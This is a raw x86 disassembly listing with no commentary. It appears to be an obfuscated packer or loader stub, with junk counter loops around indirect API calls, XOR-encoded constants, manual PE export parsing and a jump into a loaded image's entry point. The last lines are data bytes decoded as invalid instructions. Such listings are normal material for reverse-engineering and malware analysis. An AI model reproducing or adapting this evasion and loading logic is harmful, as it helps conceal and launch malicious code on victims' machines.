  4088fe:	xor    edx,DWORD PTR ds:0x44b6e8
  408904:	dec    edx
  408905:	mov    DWORD PTR ds:0x44b6e8,edx
  40890b:	mov    edx,DWORD PTR ds:0x44b6e8
  408911:	dec    edx
  408912:	mov    DWORD PTR ds:0x44b6e8,edx
  408918:	jmp    0x4088cc
  40891d:	and    DWORD PTR ds:0x41073f,0x0
  408927:	jmp    0x40893b
  40892c:	xor    edx,edx
  40892e:	xor    edx,DWORD PTR ds:0x41073f
  408934:	inc    edx
  408935:	mov    DWORD PTR ds:0x41073f,edx
  40893b:	cmp    DWORD PTR ds:0x41073f,0x11
  408942:	jae    0x408985
  408948:	cmp    DWORD PTR ds:0x41073f,0x7
  40894f:	jne    0x40895e
  408955:	push   DWORD PTR [ebp-0xc]
  408958:	call   DWORD PTR ds:0x443394
  40895e:	cmp    DWORD PTR ds:0x41073f,0x6
  408965:	jne    0x40897a
  40896b:	xor    edx,edx
  40896d:	or     edx,DWORD PTR ds:0x41073f
  408973:	inc    edx
  408974:	mov    DWORD PTR ds:0x41073f,edx
  40897a:	jmp    0x40892c
  40897f:	xor    DWORD PTR ds:0x4489a8,ebx
  408985:	mov    eax,DWORD PTR [eax+0x198]
  40898b:	mov    DWORD PTR [ebp-0x8],eax
  40898e:	or     DWORD PTR ds:0x4489a4,0xc15
  408998:	mov    eax,DWORD PTR [ebp-0x1c]
  40899b:	mov    edx,DWORD PTR [ebp-0x8]
  40899e:	xor    ebx,0x1805
  4089a4:	xor    eax,esi
  4089a6:	dec    ebx
  4089a7:	add    eax,edi
  4089a9:	sbb    ebx,DWORD PTR ds:0x41074f
  4089af:	mov    DWORD PTR [edx],eax
  4089b1:	add    ebx,DWORD PTR ds:0x44b6d4
  4089b7:	lea    eax,[ebp-0x10]
  4089ba:	dec    ebx
  4089bb:	mov    DWORD PTR [ebp-0x34],eax
  4089be:	and    DWORD PTR ds:0x410757,0x0
  4089c8:	jmp    0x4089db
  4089cd:	xor    eax,eax
  4089cf:	or     eax,DWORD PTR ds:0x410757
  4089d5:	inc    eax
  4089d6:	mov    ds:0x410757,eax
  4089db:	cmp    DWORD PTR ds:0x410757,0x13
  4089e2:	jae    0x408a35
  4089e8:	cmp    DWORD PTR ds:0x410757,0x6
  4089ef:	jne    0x408a0d
  4089f5:	push   0x1b4e
  4089fa:	push   0x76a9
  4089ff:	push   DWORD PTR [ebp-0x1c]
  408a02:	push   0x886b
  408a07:	call   DWORD PTR ds:0x443398
  408a0d:	cmp    DWORD PTR ds:0x410757,0x5
  408a14:	jne    0x408a25
  408a1a:	mov    eax,ds:0x410757
  408a1f:	inc    eax
  408a20:	mov    ds:0x410757,eax
  408a25:	jmp    0x4089cd
  408a2a:	mov    eax,ds:0x44b6dc
  408a2f:	and    DWORD PTR ds:0x4247ca,eax
  408a35:	mov    eax,DWORD PTR [ebp-0x1c]
  408a38:	adc    edx,0x330f
  408a3e:	mov    edx,DWORD PTR [ebp-0x34]
  408a41:	sub    DWORD PTR ds:0x41074b,ebx
  408a47:	xor    eax,esi
  408a49:	mov    DWORD PTR ds:0x448980,0x18
  408a53:	cmp    DWORD PTR ds:0x448980,0x0
  408a5a:	je     0x408b05
  408a60:	cmp    DWORD PTR ds:0x448980,0x2
  408a67:	jne    0x408a82
  408a6d:	push   DWORD PTR [ebp-0x28]
  408a70:	push   DWORD PTR [ebp-0x20]
  408a73:	push   DWORD PTR [ebp-0x10]
  408a76:	push   DWORD PTR [ebp-0x1c]
  408a79:	push   DWORD PTR [ebp-0x28]
  408a7c:	call   DWORD PTR ds:0x4430fc
  408a82:	cmp    DWORD PTR ds:0x448980,0x3
  408a89:	jne    0x408a9e
  408a8f:	xor    ebx,ebx
  408a91:	xor    ebx,DWORD PTR ds:0x448980
  408a97:	dec    ebx
  408a98:	mov    DWORD PTR ds:0x448980,ebx
  408a9e:	xor    ebx,ebx
  408aa0:	add    ebx,DWORD PTR ds:0x448980
  408aa6:	dec    ebx
  408aa7:	mov    DWORD PTR ds:0x448980,ebx
  408aad:	jmp    0x408a53
  408ab2:	and    DWORD PTR ds:0x4247c6,0x0
  408abc:	jmp    0x408ace
  408ac1:	mov    ebx,DWORD PTR ds:0x4247c6
  408ac7:	inc    ebx
  408ac8:	mov    DWORD PTR ds:0x4247c6,ebx
  408ace:	cmp    DWORD PTR ds:0x4247c6,0x10
  408ad5:	jae    0x408b05
  408adb:	cmp    DWORD PTR ds:0x4247c6,0x19
  408ae2:	jne    0x408af3
  408ae8:	push   0x82d5
  408aed:	call   DWORD PTR ds:0x443100
  408af3:	jmp    0x408ac1
  408af8:	movzx  ebx,WORD PTR ds:0x410757
  408aff:	and    DWORD PTR ds:0x4489a8,ebx
  408b05:	add    eax,edi
  408b07:	adc    DWORD PTR ds:0x4247d2,0x6c9f
  408b11:	mov    DWORD PTR [edx],eax
  408b13:	mov    DWORD PTR [ebp-0x2c],ecx
  408b16:	lea    eax,[ebp-0x2c]
  408b19:	or     ebx,ebx
  408b1b:	mov    DWORD PTR [ebp-0x14],eax
  408b1e:	add    ebx,eax
  408b20:	mov    eax,DWORD PTR [ebp-0x2c]
  408b23:	sub    ebx,0x4e67
  408b29:	mov    ecx,DWORD PTR [ebp-0x14]
  408b2c:	xor    eax,esi
  408b2e:	adc    ebx,0x2698
  408b34:	add    eax,0x32729e
  408b39:	and    DWORD PTR ds:0x4247da,0x0
  408b43:	mov    ebx,DWORD PTR ds:0x4247da
  408b49:	inc    ebx
  408b4a:	mov    DWORD PTR ds:0x4247da,ebx
  408b50:	cmp    DWORD PTR ds:0x4247da,0xb
  408b57:	jne    0x408b68
  408b5d:	push   0x410870
  408b62:	call   DWORD PTR ds:0x443104
  408b68:	cmp    DWORD PTR ds:0x4247da,0xa
  408b6f:	jne    0x408b82
  408b75:	mov    ebx,DWORD PTR ds:0x4247da
  408b7b:	inc    ebx
  408b7c:	mov    DWORD PTR ds:0x4247da,ebx
  408b82:	cmp    DWORD PTR ds:0x4247da,0x19
  408b89:	jb     0x408b43
  408b8f:	adc    ebx,DWORD PTR ds:0x41074b
  408b95:	mov    DWORD PTR [ecx],eax
  408b97:	sub    DWORD PTR ds:0x44b6dc,0x6b19
  408ba1:	mov    eax,ds:0x445274
  408ba6:	sbb    ebx,0x4548
  408bac:	mov    DWORD PTR [ebp-0x24],0x8e12febe
  408bb3:	xor    DWORD PTR ds:0x448998,edx
  408bb9:	mov    eax,DWORD PTR [eax]
  408bbb:	xor    DWORD PTR ds:0x44b6d0,ebx
  408bc1:	mov    cx,WORD PTR [ebp-0x10]
  408bc5:	movzx  ecx,cx
  408bc8:	xor    ebx,DWORD PTR ds:0x410757
  408bce:	add    ecx,DWORD PTR [eax]
  408bd0:	mov    DWORD PTR [ebp-0x40],0xf89c8531
  408bd7:	mov    ebx,DWORD PTR ds:0x448994
  408bdd:	sub    DWORD PTR ds:0x44b6e0,ebx
  408be3:	mov    DWORD PTR [ebp-0x14],ecx
  408be6:	xor    ebx,ebx
  408be8:	mov    ebx,0x5a3fc9e
  408bed:	and    DWORD PTR ds:0x44898c,0x0
  408bf7:	mov    ecx,DWORD PTR ds:0x44898c
  408bfd:	inc    ecx
  408bfe:	mov    DWORD PTR ds:0x44898c,ecx
  408c04:	cmp    DWORD PTR ds:0x44898c,0x7
  408c0b:	jne    0x408c36
  408c11:	push   0x7083
  408c16:	push   0x1db3
  408c1b:	push   0x7eea
  408c20:	push   0x448984
  408c25:	push   DWORD PTR [ebp-0x14]
  408c28:	push   DWORD PTR [ebp-0x24]
  408c2b:	push   0x41089f
  408c30:	call   DWORD PTR ds:0x44339c
  408c36:	cmp    DWORD PTR ds:0x44898c,0x6
  408c3d:	jne    0x408c50
  408c43:	mov    ecx,DWORD PTR ds:0x44898c
  408c49:	inc    ecx
  408c4a:	mov    DWORD PTR ds:0x44898c,ecx
  408c50:	cmp    DWORD PTR ds:0x44898c,0x10
  408c57:	jb     0x408bf7
  408c5d:	mov    eax,DWORD PTR [ebp-0x1c]
  408c60:	mov    ecx,DWORD PTR [ebp-0x8]
  408c63:	xor    eax,esi
  408c65:	add    eax,edi
  408c67:	mov    DWORD PTR ds:0x410757,0x128d
  408c71:	cmp    DWORD PTR [ecx],eax
  408c73:	mov    DWORD PTR ds:0x4247d6,0x2c74
  408c7d:	jne    0x408de6
  408c83:	movzx  eax,BYTE PTR ds:0x410747
  408c8a:	adc    eax,DWORD PTR ds:0x410753
  408c90:	mov    ds:0x410747,eax
  408c95:	mov    eax,DWORD PTR [ebp-0x1c]
  408c98:	mov    ecx,DWORD PTR [ebp-0x14]
  408c9b:	or     DWORD PTR ds:0x44e424,0x44e420
  408ca5:	xor    eax,esi
  408ca7:	or     DWORD PTR ds:0x448988,0x44e428
  408cb1:	add    eax,edi
  408cb3:	mov    DWORD PTR ds:0x44899c,0x2417
  408cbd:	cmp    DWORD PTR [ecx],eax
  408cbf:	jne    0x408d21
  408cc5:	dec    edx
  408cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  408cc9:	sbb    DWORD PTR ds:0x44e424,0x7bb6
  408cd3:	mov    ecx,DWORD PTR [ebp-0x34]
  408cd6:	adc    DWORD PTR ds:0x448990,ecx
  408cdc:	xor    eax,esi
  408cde:	xor    DWORD PTR ds:0x44e420,0x6611
  408ce8:	add    eax,edi
  408cea:	movzx  edx,WORD PTR ds:0x4247c2
  408cf1:	sbb    DWORD PTR ds:0x4247ca,edx
  408cf7:	mov    DWORD PTR [ecx],eax
  408cf9:	dec    ecx
  408cfa:	mov    eax,DWORD PTR [ebp-0x34]
  408cfd:	mov    ecx,DWORD PTR [ebp-0x40]
  408d00:	sbb    edx,DWORD PTR ds:0x44e420
  408d06:	xor    ecx,esi
  408d08:	adc    edx,DWORD PTR ds:0x4489a8
  408d0e:	mov    edx,0xffcd8d62
  408d13:	sbb    DWORD PTR ds:0x448984,0x448980
  408d1d:	sub    edx,ecx
  408d1f:	add    DWORD PTR [eax],edx
  408d21:	mov    DWORD PTR ds:0x410747,0x19
  408d2b:	cmp    DWORD PTR ds:0x410747,0x0
  408d32:	je     0x408d8e
  408d38:	cmp    DWORD PTR ds:0x410747,0x5
  408d3f:	jne    0x408d63
  408d45:	push   DWORD PTR [ebp-0x1c]
  408d48:	push   0x2684
  408d4d:	push   DWORD PTR [ebp-0x18]
  408d50:	push   DWORD PTR [ebp-0x28]
  408d53:	push   0x71f6
  408d58:	push   0x2f24
  408d5d:	call   DWORD PTR ds:0x4433a0
  408d63:	cmp    DWORD PTR ds:0x410747,0x6
  408d6a:	jne    0x408d7b
  408d70:	mov    eax,ds:0x410747
  408d75:	dec    eax
  408d76:	mov    ds:0x410747,eax
  408d7b:	xor    eax,eax
  408d7d:	or     eax,DWORD PTR ds:0x410747
  408d83:	dec    eax
  408d84:	mov    ds:0x410747,eax
  408d89:	jmp    0x408d2b
  408d8e:	mov    eax,ds:0x445274
  408d93:	mov    eax,DWORD PTR [eax]
  408d95:	mov    cx,WORD PTR [ebp-0x10]
  408d99:	movzx  ecx,cx
  408d9c:	add    ecx,DWORD PTR [eax]
  408d9e:	mov    DWORD PTR [ebp-0x14],ecx
  408da1:	mov    eax,DWORD PTR [ebp-0x28]
  408da4:	mov    ecx,DWORD PTR [ebp-0x28]
  408da7:	xor    eax,esi
  408da9:	lea    eax,[eax+eax*1+0x32729e]
  408db0:	xor    ecx,esi
  408db2:	sub    ecx,eax
  408db4:	mov    ax,WORD PTR [ebp-0x10]
  408db8:	movzx  eax,ax
  408dbb:	cmp    eax,ecx
  408dbd:	mov    eax,DWORD PTR [ebp-0x40]
  408dc0:	movzx  ecx,WORD PTR [ebp-0x10]
  408dc4:	jg     0x408dd9
  408dca:	xor    eax,esi
  408dcc:	sub    ecx,eax
  408dce:	sub    ecx,edi
  408dd0:	mov    WORD PTR [ebp-0x10],cx
  408dd4:	jmp    0x408de6
  408dd9:	xor    eax,esi
  408ddb:	lea    eax,[eax+ecx*1+0x32729e]
  408de2:	mov    WORD PTR [ebp-0x10],ax
  408de6:	mov    ecx,DWORD PTR [ebp-0x24]
  408de9:	mov    eax,0x8e12febe
  408dee:	cmp    ecx,eax
  408df0:	je     0x408e04
  408df6:	mov    eax,DWORD PTR [ebp-0x8]
  408df9:	mov    DWORD PTR [eax],0x60341e8d
  408dff:	jmp    0x40902a
  408e04:	mov    ecx,DWORD PTR [ebp-0x24]
  408e07:	cmp    ecx,0x5142ddbc
  408e0d:	jne    0x408e85
  408e13:	mov    eax,DWORD PTR [ebp-0x8]
  408e16:	mov    DWORD PTR [eax],0x4214febc
  408e1c:	mov    eax,DWORD PTR [ebp-0x8]
  408e1f:	mov    DWORD PTR [ebp-0xc],eax
  408e22:	mov    eax,DWORD PTR [ebp-0x28]
  408e25:	mov    eax,DWORD PTR [ebp-0x1c]
  408e28:	mov    DWORD PTR [ebp-0x3c],ebx
  408e2b:	mov    eax,DWORD PTR [ebp-0x3c]
  408e2e:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408e35:	cmp    eax,ebx
  408e37:	jne    0x40902a
  408e3d:	mov    ax,WORD PTR [ebp-0x4]
  408e41:	mov    ecx,0x8a42
  408e46:	xor    ax,cx
  408e49:	mov    ecx,0x3b08
  408e4e:	add    ax,cx
  408e51:	mov    ecx,DWORD PTR [ebp-0xc]
  408e54:	movzx  eax,ax
  408e57:	not    eax
  408e59:	and    eax,DWORD PTR [ecx]
  408e5b:	mov    ecx,DWORD PTR [ebp-0xc]
  408e5e:	mov    DWORD PTR [ecx],eax
  408e60:	jmp    0x408e6c
  408e65:	xor    DWORD PTR [ebp-0x3c],0xe149ebe
  408e6c:	mov    ax,WORD PTR [ebp-0x4]
  408e70:	push   DWORD PTR [ebp-0xc]
  408e73:	call   0x407112
  408e78:	test   eax,eax
  408e7a:	je     0x408e65
  408e80:	jmp    0x40902a
  408e85:	mov    ecx,DWORD PTR [ebp-0x24]
  408e88:	cmp    ecx,0x1443fcbd
  408e8e:	jne    0x408ea2
  408e94:	mov    eax,DWORD PTR [ebp-0x8]
  408e97:	mov    DWORD PTR [eax],0x60062d8f
  408e9d:	jmp    0x40902a
  408ea2:	mov    ecx,DWORD PTR [ebp-0x24]
  408ea5:	cmp    ecx,eax
  408ea7:	jne    0x408faf
  408ead:	mov    eax,DWORD PTR [ebp-0x1c]
  408eb0:	mov    ecx,DWORD PTR [ebp-0x8]
  408eb3:	xor    eax,esi
  408eb5:	add    eax,edi
  408eb7:	cmp    DWORD PTR [ecx],eax
  408eb9:	je     0x408f3c
  408ebf:	mov    ecx,DWORD PTR [ebp-0x2c]
  408ec2:	mov    eax,DWORD PTR [ebp-0x8]
  408ec5:	mov    eax,DWORD PTR [eax]
  408ec7:	mov    eax,DWORD PTR [eax+0x3c]
  408eca:	lea    ecx,[ecx*8+0x78]
  408ed1:	add    eax,ecx
  408ed3:	mov    ecx,DWORD PTR [ebp-0x8]
  408ed6:	mov    ecx,DWORD PTR [ecx]
  408ed8:	mov    eax,DWORD PTR [eax+ecx*1]
  408edb:	mov    DWORD PTR [ebp-0x4],eax
  408ede:	mov    eax,DWORD PTR [ebp-0x1c]
  408ee1:	xor    eax,esi
  408ee3:	add    eax,edi
  408ee5:	mov    DWORD PTR [ebp-0xc],eax
  408ee8:	mov    eax,DWORD PTR [ebp-0x1c]
  408eeb:	mov    ecx,DWORD PTR [ebp-0x4]
  408eee:	xor    eax,esi
  408ef0:	add    eax,edi
  408ef2:	cmp    ecx,eax
  408ef4:	je     0x40902a
  408efa:	mov    eax,DWORD PTR [ebp-0x8]
  408efd:	mov    ecx,DWORD PTR [ebp-0x4]
  408f00:	add    ecx,DWORD PTR [eax]
  408f02:	mov    DWORD PTR [ebp-0xc],ecx
  408f05:	mov    eax,DWORD PTR [ebp-0xc]
  408f08:	mov    ecx,DWORD PTR [ebp-0x8]
  408f0b:	mov    eax,DWORD PTR [eax+0xc]
  408f0e:	mov    ecx,DWORD PTR [ecx]
  408f10:	mov    al,BYTE PTR [eax+ecx*1]
  408f13:	add    al,0x35
  408f15:	xor    al,0x49
  408f17:	cmp    al,0xc9
  408f19:	je     0x408f30
  408f1f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f22:	mov    ecx,DWORD PTR [ebp-0x8]
  408f25:	xor    eax,esi
  408f27:	add    eax,edi
  408f29:	mov    DWORD PTR [ecx],eax
  408f2b:	jmp    0x40902a
  408f30:	xor    DWORD PTR [ebp-0x24],0x5fd8f
  408f37:	jmp    0x40902a
  408f3c:	mov    eax,DWORD PTR [ebp-0x8]
  408f3f:	mov    ecx,DWORD PTR [ebp-0x14]
  408f42:	mov    ecx,DWORD PTR [ecx]
  408f44:	mov    DWORD PTR [eax],ecx
  408f46:	mov    eax,DWORD PTR [ebp-0x8]
  408f49:	mov    DWORD PTR [ebp-0xc],eax
  408f4c:	mov    eax,DWORD PTR [ebp-0x28]
  408f4f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f52:	mov    DWORD PTR [ebp-0x44],ebx
  408f55:	mov    eax,DWORD PTR [ebp-0x44]
  408f58:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408f5f:	cmp    eax,ebx
  408f61:	jne    0x40902a
  408f67:	mov    ax,WORD PTR [ebp-0x4]
  408f6b:	mov    ecx,0x8a42
  408f70:	xor    ax,cx
  408f73:	mov    ecx,0x3b08
  408f78:	add    ax,cx
  408f7b:	mov    ecx,DWORD PTR [ebp-0xc]
  408f7e:	movzx  eax,ax
  408f81:	not    eax
  408f83:	and    eax,DWORD PTR [ecx]
  408f85:	mov    ecx,DWORD PTR [ebp-0xc]
  408f88:	mov    DWORD PTR [ecx],eax
  408f8a:	jmp    0x408f96
  408f8f:	xor    DWORD PTR [ebp-0x44],0xe149ebe
  408f96:	mov    ax,WORD PTR [ebp-0x4]
  408f9a:	push   DWORD PTR [ebp-0xc]
  408f9d:	call   0x407112
  408fa2:	test   eax,eax
  408fa4:	je     0x408f8f
  408faa:	jmp    0x40902a
  408faf:	mov    eax,DWORD PTR [ebp-0x24]
  408fb2:	cmp    eax,0x33450cad
  408fb7:	jne    0x40902a
  408fbd:	mov    eax,DWORD PTR [ebp-0x8]
  408fc0:	mov    DWORD PTR [eax],0x443dc9d
  408fc6:	mov    eax,DWORD PTR [ebp-0x8]
  408fc9:	mov    DWORD PTR [ebp-0xc],eax
  408fcc:	mov    eax,DWORD PTR [ebp-0x28]
  408fcf:	mov    eax,DWORD PTR [ebp-0x1c]
  408fd2:	mov    DWORD PTR [ebp-0x38],ebx
  408fd5:	mov    eax,DWORD PTR [ebp-0x38]
  408fd8:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408fdf:	cmp    eax,ebx
  408fe1:	jne    0x40902a
  408fe7:	mov    ax,WORD PTR [ebp-0x4]
  408feb:	mov    ecx,0x8a42
  408ff0:	xor    ax,cx
  408ff3:	mov    ecx,0x3b08
  408ff8:	add    ax,cx
  408ffb:	mov    ecx,DWORD PTR [ebp-0xc]
  408ffe:	movzx  eax,ax
  409001:	not    eax
  409003:	and    eax,DWORD PTR [ecx]
  409005:	mov    ecx,DWORD PTR [ebp-0xc]
  409008:	mov    DWORD PTR [ecx],eax
  40900a:	jmp    0x409016
  40900f:	xor    DWORD PTR [ebp-0x38],0xe149ebe
  409016:	mov    ax,WORD PTR [ebp-0x4]
  40901a:	push   DWORD PTR [ebp-0xc]
  40901d:	call   0x407112
  409022:	test   eax,eax
  409024:	je     0x40900f
  40902a:	mov    eax,DWORD PTR [ebp-0x24]
  40902d:	cmp    eax,0x8e12febe
  409032:	je     0x408bed
  409038:	mov    eax,DWORD PTR [ebp-0x8]
  40903b:	mov    eax,ds:0x4451a0
  409040:	mov    eax,DWORD PTR [eax+0x18c]
  409046:	mov    eax,DWORD PTR [eax]
  409048:	mov    DWORD PTR [ebp-0x58],eax
  40904b:	mov    eax,0xf89c8531
  409050:	mov    DWORD PTR [ebp-0x14],eax
  409053:	mov    DWORD PTR [ebp-0x14],eax
  409056:	mov    DWORD PTR [ebp-0x14],eax
  409059:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  409060:	mov    DWORD PTR [ebp-0x4],eax
  409063:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  40906a:	mov    ebx,DWORD PTR [ebp-0x20]
  40906d:	xor    ebx,esi
  40906f:	add    ebx,edi
  409071:	jmp    0x4090ac
  409076:	mov    eax,DWORD PTR [ebp-0x18]
  409079:	xor    eax,esi
  40907b:	lea    eax,[eax+ebx*1+0x32729e]
  409082:	push   eax
  409083:	mov    eax,DWORD PTR [ebp-0x14]
  409086:	xor    eax,esi
  409088:	lea    eax,[ebp+eax*1+0x3272a6]
  40908f:	push   eax
  409090:	mov    eax,ds:0x4451a0
  409095:	push   DWORD PTR [eax+0x1bc]
  40909b:	call   0x402c35
  4090a0:	mov    eax,DWORD PTR [ebp-0x18]
  4090a3:	xor    eax,esi
  4090a5:	lea    ebx,[ebx+eax*1+0x32729e]
  4090ac:	mov    eax,DWORD PTR [ebp-0x18]
  4090af:	mov    ecx,DWORD PTR [ebp-0x18]
  4090b2:	xor    ecx,esi
  4090b4:	xor    eax,esi
  4090b6:	add    eax,ecx
  4090b8:	mov    ecx,DWORD PTR [ebp-0x18]
  4090bb:	xor    ecx,esi
  4090bd:	lea    eax,[eax+ecx*1+0x9757da]
  4090c4:	cmp    ebx,eax
  4090c6:	jbe    0x409076
  4090cc:	mov    eax,DWORD PTR [ebp+0xc]
  4090cf:	mov    ds:0x445024,eax
  4090d4:	mov    eax,DWORD PTR [ebp+0x10]
  4090d7:	mov    ds:0x445278,eax
  4090dc:	mov    eax,ds:0x445024
  4090e1:	mov    ecx,DWORD PTR [ebp-0x30]
  4090e4:	sub    eax,edi
  4090e6:	xor    eax,esi
  4090e8:	mov    DWORD PTR [ecx],eax
  4090ea:	mov    eax,DWORD PTR [ebp-0x4c]
  4090ed:	cmp    eax,0xf89c8534
  4090f2:	je     0x40914f
  4090f8:	mov    eax,DWORD PTR [ebp-0x20]
  4090fb:	mov    ecx,DWORD PTR [ebp-0x54]
  4090fe:	xor    eax,esi
  409100:	add    eax,edi
  409102:	cmp    eax,ecx
  409104:	je     0x40914f
  40910a:	mov    eax,ds:0x4451a0
  40910f:	mov    eax,DWORD PTR [eax+0x194]
  409115:	mov    ecx,DWORD PTR [eax]
  409117:	mov    eax,DWORD PTR [ecx+0x3c]
  40911a:	push   DWORD PTR ds:0x445278
  409120:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409124:	push   DWORD PTR ds:0x445024
  40912a:	add    eax,ecx
  40912c:	mov    ecx,DWORD PTR ds:0x4451a0
  409132:	mov    ecx,DWORD PTR [ecx+0x194]
  409138:	push   DWORD PTR [ecx]
  40913a:	call   eax
  40913c:	mov    ecx,DWORD PTR ds:0x4451a0
  409142:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409148:	mov    DWORD PTR [ecx],eax
  40914a:	jmp    0x409276
  40914f:	mov    eax,DWORD PTR [ebp-0x20]
  409152:	mov    ecx,DWORD PTR [ebp-0x58]
  409155:	xor    eax,esi
  409157:	add    eax,edi
  409159:	cmp    eax,ecx
  40915b:	jne    0x409259
  409161:	mov    eax,DWORD PTR [ebp-0x20]
  409164:	xor    eax,esi
  409166:	add    eax,edi
  409168:	mov    ds:0x445224,eax
  40916d:	mov    eax,DWORD PTR [ebp-0x20]
  409170:	xor    eax,esi
  409172:	add    eax,edi
  409174:	mov    ds:0x44521c,eax
  409179:	mov    eax,DWORD PTR [ebp-0x18]
  40917c:	mov    DWORD PTR [ebp-0x14],eax
  40917f:	mov    eax,DWORD PTR [ebp-0x20]
  409182:	mov    DWORD PTR [ebp+0xc],eax
  409185:	mov    eax,DWORD PTR [ebp+0xc]
  409188:	xor    eax,esi
  40918a:	add    eax,edi
  40918c:	mov    DWORD PTR [ebp+0xc],eax
  40918f:	mov    eax,ds:0x445020
  409194:	mov    eax,DWORD PTR [eax]
  409196:	mov    DWORD PTR [ebp+0xc],eax
  409199:	mov    eax,ds:0x445228
  40919e:	mov    eax,DWORD PTR [eax]
  4091a0:	mov    DWORD PTR [ebp-0x30],eax
  4091a3:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  4091aa:	mov    eax,DWORD PTR [ebp+0x10]
  4091ad:	xor    eax,esi
  4091af:	add    eax,edi
  4091b1:	mov    DWORD PTR [ebp+0x10],eax
  4091b4:	mov    eax,ds:0x4451a0
  4091b9:	mov    DWORD PTR [ebp+0x10],eax
  4091bc:	mov    eax,DWORD PTR [ebp+0xc]
  4091bf:	mov    DWORD PTR [ebp+0xc],eax
  4091c2:	mov    eax,DWORD PTR [ebp+0xc]
  4091c5:	push   0x4
  4091c7:	pop    ecx
  4091c8:	sub    ecx,eax
  4091ca:	add    ecx,DWORD PTR [ebp-0x30]
  4091cd:	mov    DWORD PTR [ebp-0x4],0xf89c85f5
  4091d4:	mov    DWORD PTR [ebp+0x10],ecx
  4091d7:	mov    DWORD PTR [ebp-0xa0],0xf89c8531
  4091e1:	mov    eax,DWORD PTR [ebp+0xc]
  4091e4:	mov    DWORD PTR [ebp-0x9c],eax
  4091ea:	mov    eax,DWORD PTR [ebp+0x10]
  4091ed:	mov    DWORD PTR [ebp-0x98],eax
  4091f3:	mov    eax,DWORD PTR [ebp-0x4]
  4091f6:	xor    eax,esi
  4091f8:	add    eax,edi
  4091fa:	mov    DWORD PTR [ebp-0x94],eax
  409200:	lea    eax,[ebp-0x5c]
  409203:	mov    DWORD PTR [ebp-0x90],eax
  409209:	mov    eax,DWORD PTR [ebp-0xa0]
  40920f:	xor    eax,esi
  409211:	add    eax,edi
  409213:	mov    DWORD PTR [ebp-0xa0],eax
  409219:	lea    eax,[ebp-0xa0]
  40921f:	push   eax
  409220:	mov    eax,DWORD PTR [ebp-0x14]
  409223:	xor    eax,esi
  409225:	add    eax,edi
  409227:	push   eax
  409228:	mov    eax,ds:0x4451c0
  40922d:	push   0x445116
  409232:	push   DWORD PTR [eax]
  409234:	call   0x40101c
  409239:	xor    esi,esi
  40923b:	mov    eax,DWORD PTR [ebp+0x10]
  40923e:	sub    eax,esi
  409240:	push   eax
  409241:	mov    eax,DWORD PTR [ebp+0xc]
  409244:	add    eax,esi
  409246:	push   eax
  409247:	call   0x40354e
  40924c:	inc    esi
  40924d:	cmp    esi,0x52
  409250:	jb     0x40923b
  409256:	mov    eax,DWORD PTR [ebp-0x14]
  409259:	call   0x405b6e
  40925e:	lea    eax,[ebp+0x4]
  409261:	mov    DWORD PTR [ebp-0x50],eax
  409264:	mov    eax,DWORD PTR [ebp-0x48]
  409267:	mov    eax,DWORD PTR [ebp-0x18]
  40926a:	push   DWORD PTR [ebp-0x20]
  40926d:	lea    eax,[ebp-0x50]
  409270:	push   eax
  409271:	call   0x40324f
  409276:	mov    eax,ds:0x4451a0
  40927b:	push   0x4
  40927d:	add    eax,0x1cc
  409282:	push   eax
  409283:	lea    eax,[ebp-0x48]
  409286:	push   eax
  409287:	call   0x402c35
  40928c:	mov    eax,DWORD PTR [ebp-0x48]
  40928f:	mov    eax,DWORD PTR [eax]
  409291:	pop    edi
  409292:	pop    ebx
  409293:	pop    esi
  409294:	leave  
  409295:	ret    0xc
  409298:	push   ebp
  409299:	mov    ebp,esp
  40929b:	sub    esp,0x58
  40929e:	add    eax,ecx
  4092a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4092a3:	sub    eax,DWORD PTR ds:0x448988
  4092a9:	mov    eax,0x8a42
  4092ae:	add    DWORD PTR ds:0x410753,0x4247ca
  4092b8:	xor    ax,WORD PTR [ecx+0x20]
  4092bc:	and    DWORD PTR ds:0x448990,0x0
  4092c6:	mov    ecx,DWORD PTR ds:0x448990
  4092cc:	inc    ecx
  4092cd:	mov    DWORD PTR ds:0x448990,ecx
  4092d3:	cmp    DWORD PTR ds:0x448990,0x9
  4092da:	jne    0x4092f3
  4092e0:	push   DWORD PTR [ebp-0x28]
  4092e3:	push   0x44899c
  4092e8:	push   0x55d9
  4092ed:	call   DWORD PTR ds:0x4433a4
  4092f3:	cmp    DWORD PTR ds:0x448990,0x8
  4092fa:	jne    0x40930d
  409300:	mov    ecx,DWORD PTR ds:0x448990
  409306:	inc    ecx
  409307:	mov    DWORD PTR ds:0x448990,ecx
  40930d:	cmp    DWORD PTR ds:0x448990,0x14
  409314:	jb     0x4092c6
  40931a:	mov    ecx,0x3b08
  40931f:	add    ax,cx
  409322:	movzx  eax,ax
  409325:	sub    ecx,0x7afe
  40932b:	mov    DWORD PTR [ebp-0xc],eax
  40932e:	mov    BYTE PTR [ebp-0x1],0x7f
  409332:	lea    eax,[ebp-0x1]
  409335:	mov    DWORD PTR [ebp-0x10],eax
  409338:	and    ecx,0x503
  40933e:	jmp    0x409494
  409343:	mov    ?,ebx
  409345:	icebp  
  409346:	test   al,0x85
  409348:	stos   BYTE PTR es:[edi],al
  409349:	mov    ebp,0xef32abd
  40934e:	cmp    eax,0xe686a43a
  409353:	(bad)  
  409357:	daa    
  409358:	jg     0x4093d6
  40935a:	jl     0x4093c8
  40935c:	and    ch,BYTE PTR [edi-0x55]
  40935f:	ins    DWORD PTR es:[edi],dx
  409360:	cs xchg ecx,eax
  409362:	jmp    0x4093e0
  409364:	mov    ebx,0x7d9e2709
  409369:	cmovbe esi,DWORD PTR [ebp+edi*4-0x3a]
  40936e:	mov    cl,0xc1
  409370:	pushf  
  409371:	int3   
  409372:	addr16 js 0x409303
  409375:	mov    bh,0xb
  409377:	xchg   esp,eax
  409378:	je     0x4093d9
  40937a:	repnz push ecx
  40937c:	out    dx,eax
  40937d:	pop    ebx
  40937e:	je     0x409303
  409380:	popa   
  409381:	in     al,dx
  409382:	and    DWORD PTR [ecx+esi*2-0x704083b0],esi
